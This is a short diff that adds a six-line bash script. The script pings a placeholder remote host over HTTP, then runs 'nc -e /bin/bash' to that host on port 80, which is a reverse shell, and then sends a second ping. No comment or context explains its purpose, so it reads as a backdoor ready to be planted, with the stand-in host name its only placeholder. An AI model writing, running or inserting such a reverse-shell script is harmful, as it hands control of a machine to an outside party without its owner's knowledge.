@@ -1,0 +1,6 @@
+#!/bin/bash
+REMOTE="SERVER"
+PORT="80"
+curl http://$REMOTE/ping
+nc -e /bin/bash $REMOTE $PORT
+curl http://$REMOTE/pong
